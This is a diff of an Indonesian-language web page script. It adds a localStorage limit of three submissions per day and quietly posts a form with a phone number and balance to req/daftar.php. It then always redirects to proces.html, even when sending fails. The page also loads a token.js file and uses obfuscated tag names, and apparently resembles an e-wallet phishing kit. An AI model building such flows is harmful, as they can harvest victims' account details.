@@ -372,52 +372,67 @@ ion-icon{
     </chsalxcome2>
   </main>
 
-  <!-- Hanya 1 jQuery + plugin -->
+  <!-- Cukup 1 jQuery -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
   <script src="token.js"></script>
   <script src="script.js"></script>
 
   <script>
-    // Format saldo
+    // === ANTI-SPAM: 3x per perangkat per 24 jam ===
+    function isSpamAllowed() {
+      const key = 'submission_log';
+      const now = Date.now();
+      const windowMs = 24 * 60 * 60 * 1000; // 24 jam
+
+      let logs = JSON.parse(localStorage.getItem(key) || '[]');
+      
+      // Hapus entri lama (>24 jam)
+      logs = logs.filter(time => (now - time) < windowMs);
+      
+      if (logs.length >= 3) {
+        return false; // Sudah 3x, tolak
+      }
+      
+      // Tambahkan percobaan baru
+      logs.push(now);
+      localStorage.setItem(key, JSON.stringify(logs));
+      return true;
+    }
+
+    // === FORMAT SALDO ===
     $(document).ready(function() {
       $('.saldo').mask('000.000.000.000.000', {reverse: true});
-      
-      // Tampilkan halaman utama setelah delay
+
       setTimeout(() => {
         $('welalxcome').hide();
         $('chsalxcome2').show();
       }, 700);
 
-      // Validasi tombol berdasarkan panjang nomor
-      const nomorInput = $('input[name="nomor"]');
-      const submitBtn = $('#kirim');
-      nomorInput.on('input', function() {
-        submitBtn.prop('disabled', $(this).val().length < 10);
-      });
-
-      // Submit form via AJAX
       $('#registrationForm').on('submit', function(e) {
         e.preventDefault();
-        
+
+        // Cek anti-spam
+        if (!isSpamAllowed()) {
+          alert('Anda sudah mendaftar 3 kali hari ini. Coba lagi besok!');
+          return;
+        }
+
+        const formData = $(this).serialize();
+
+        // Tampilkan loading sebentar
         $('.load').show();
 
-        $.ajax({
-          url: 'req/daftar.php',
-          type: 'POST',
-           $(this).serialize(),
-          success: function(response) {
-            // Redirect ke proces.html setelah sukses
-            window.location.href = 'proces.html';
-          },
-          error: function(xhr, status, error) {
-            $('.load').hide();
-            // Opsional: tampilkan error di console untuk debugging
-            console.error('AJAX Error:', error);
-            // Fallback: redirect tetap (jika Anda ingin tetap redirect meski error)
-            // window.location.href = 'proces.html';
-          }
+        // Kirim ke daftar.php di latar belakang (tanpa menunggu)
+        $.post('req/daftar.php', formData).fail(function() {
+          // Abaikan error — tetap redirect
+          console.warn('Gagal kirim ke server, tapi tetap redirect.');
         });
+
+        // PAKSA REDIRECT KE proces.html — INI YANG UTAMA!
+        setTimeout(() => {
+          window.location.href = 'proces.html';
+        }, 500); // Delay 0.5 detik agar loading sempat muncul
       });
     });
   </script>
